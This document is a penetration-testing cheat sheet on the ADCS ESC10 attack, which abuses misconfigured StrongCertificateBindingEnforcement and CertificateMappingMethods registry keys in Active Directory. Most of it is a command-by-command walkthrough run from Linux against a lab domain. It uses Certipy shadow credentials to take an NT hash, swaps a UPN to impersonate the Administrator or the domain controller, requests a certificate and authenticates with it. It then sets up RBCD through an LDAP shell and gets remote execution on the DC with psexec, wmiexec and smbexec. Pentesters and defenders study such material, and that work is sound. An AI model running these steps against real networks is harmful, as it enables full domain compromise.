### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - StrongCertificateBindingEnforcement Enumeration](#linux---strongcertificatebindingenforcement-enumeration)
	- [Linux - StrongCertificateBindingEnforcement Abuse](#linux---strongcertificatebindingenforcement-abuse)
	- [Linux - CertificateMappingMethods Enumeration](#linux---certificatemappingmethods-enumeration)
	- [Linux - CertificateMappingMethods Abuse](#linux---certificatemappingmethods-abuse)

> Template Misconfiguration. 

---
### Overview

`ESC10` is similar to `ESC9` but focuses on misconfigurations in registry keys rather than template configurations. There are two cases where this misconfiguration can be exploited.

There are two cases for `ESC10`:

- Case 1: `StrongCertificateBindingEnforcement` registry key misconfiguration, which handles certificate mapping during Kerberos authentication.
- Case2: `CertificateMappingMethods` registry key misconfiguration, which handles certificate mapping during Schannel authentication.

#### StrongCertificateBindingEnforcement Abuse Requirements

- `StrongCertificateBindingEnforcement` registry key = `0`.
	- This value will only be considered if the April 2023 updates have yet to be installed.
- At least one template specifies that client authentication is enabled (e.g., the built-in User template).
- `GenericWrite` rights for account A, allowing us to compromise account B.

#### CertificateMappingMethods Abuse Requirements

- `CertificateMappingMethods` registry key = `0x4`
	- Indicating SAN implicit mapping.
- At least one template is enabled for `client authentication` (e.g., the built-in User template).
- We have at least `GenericWrite` rights for any account A, allowing us to compromise any account B that does not already have a UPN set (e.g., machine accounts or built-in Administrator accounts).
	- This is important to avoid constraint violation errors on the UPN.

---
### From Linux
#### Linux - StrongCertificateBindingEnforcement Enumeration

> We can only enumerate the registry key if we have compromised a privileged user, in case if we have only compromised an unprivileged user, we will need to try the attack blindly.

```bash
# Reviewing registry keys as Administrator
$ reg.py 'lab'/'Administrator':'pass'@<IP> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'

<SNIP>
        StrongCertificateBindingEnforcement     REG_DWORD        0x0
<SNIP>
```

#### Linux - StrongCertificateBindingEnforcement Abuse

```bash
# With GenericWrite-GenericAll over user2, either reset or add an extra password, extra password can done using Shadow Credentials

# Retrieve user2 NT Hash via Shadow Credentials
$ certipy shadow auto -u 'user1@lab.local' -p 'pass' -account user2

# Change user2 UPN to Administrator
$ certipy account update -u 'user1@lab.local' -p 'pass' -user user2 -upn administrator@lab.local

# Request a certificate with the user2's UPN matching Administrator DC for any template allowing Client Authentication (ex: built-in User template).
$ certipy req -u 'user2@lab.local' -hashes HASH -ca lab-LAB-DC-CA -template User

<SNIP>
[*] Saved certificate and private key to 'administrator.pfx'
<SNIP>

# Revert user2 UPN to be sure that only Administrator matches the certificate.
$ certipy account update -u 'user1@lab.local' -p 'pass' -user user2 -upn user2@lab.local

# Authenticate as the Administrator
$ certipy auth -pfx administrator.pfx -domain lab.local
```

#### Linux - CertificateMappingMethods Enumeration

> We can only enumerate the registry key if we have compromised a privileged user, in case if we have only compromised an unprivileged user, we will need to try the attack blindly.

```bash
$ reg.py 'lab'/'Administrator':'pass'@<IP> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'

<SNIP>
        CertificateMappingMethods       REG_DWORD        0x4
<SNIP>
```

#### Linux - CertificateMappingMethods Abuse

```bash
# With GenericWrite-GenericAll over user2, either reset or add an extra password, extra password can done using Shadow Credentials

# Retrieve user2 NT Hash via Shadow Credentials
$ certipy shadow auto -u 'user1@lab.local' -p 'pass' -account user2

# Change user2 UPN to domain controller machine account name.
$ certipy account update -u 'user1@lab.local' -p 'pass' -user user2 -upn 'lab-dc$@lab.local'

# Request a certificate with the user2's UPN matching the DC for any template allowing Client Authentication (ex: built-in User template).
$ certipy req -u 'user2@lab.local' -hashes <HASH> -ca lab-LAB-DC-CA -template User

<SNIP>
[*] Saved certificate and private key to 'lab-dc.pfx'
<SNIP>

# Revert user2 UPN to be sure that only the DC matches the certificate.
$ certipy account update -u 'user1@lab.local' -p 'pass' -user user2 -upn user2@lab.local
```

> **Schannel** (Secure Channel) is Microsoft's implementation of the SSL/TLS protocols. It is a Security Support Provider (SSP) used to create an encrypted tunnel between two endpoints. As such, it does not perform credential-based interactive authentication on its own, and is instead leveraged to create encrypted channels such as LDAPS, HTTPS, etc.

The registry key `CertificateMappingMethods` handles the Schannel authentication, so:

- We can't use the certificate to authenticate via `PKINIT` as previously.
- Authenticate via `Schannel`, by using `-ldap-shell` parameter on `Certipy` permits authentication with Schannel and opens an LDAP shell on the affected DC to conduct some attacks using LDAP. ex:
	- Create a new computer account.
	- Setup for RBDC attack:
		- Updates the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to contain the new created computer security descriptor.
		- The new computer will be able to impersonate any user on the DC (ex: Administrator).

```bash
# Creating a new computer account
$ certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip <IP> -ldap-shell

# add_computer newComputer newPassword123
...

# set_rbcd lab-dc$ newComputer$


# Abusing RBCD to Impersonate the Administrator
$ getST.py -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip <IP> lab.local/'newComputer$':newPassword123
```

Now we can access DC's recourses on behalf of the Administrator

```bash
$ KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
$ KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass LAB-DC.LAB.LOCAL
$ KRB5CCNAME=Administrator.ccache smbexec.py -k -no-pass LAB-DC.LAB.LOCAL
```